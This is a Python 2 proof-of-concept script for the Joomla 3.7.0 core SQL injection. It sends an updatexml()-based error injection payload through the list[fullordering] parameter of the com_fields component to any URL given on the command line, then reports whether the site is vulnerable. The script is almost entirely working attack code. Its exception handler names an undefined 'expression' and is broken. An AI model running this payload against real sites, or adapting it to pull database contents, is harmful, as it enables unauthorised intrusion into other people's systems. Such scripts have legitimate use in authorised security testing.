#!/usr/bin/env python
# -*- coding:utf-8 -*-
__author__='adminsun'

'''
Joomla!3.7.0 Core SQLi POC
'''

import requests
import sys
import hashlib

def verify(url):
    target = "{}/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml(0x23,concat(1,(select md5(233))),1)".format(url)
    try:
        req = requests.get(target)
        response = req.content
        if hashlib.md5('233').hexdigest() in response:
            print "%s is vulnerable" % url
        else:
            print "%s is not vulnerable" % url
    except expression, e:
        print "Someting happened..."
        print e
def main():
    args = sys.argv
    url = ""

    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print "Usge: python {} url".format(args[0])

if __name__ == '__main__':
    main()
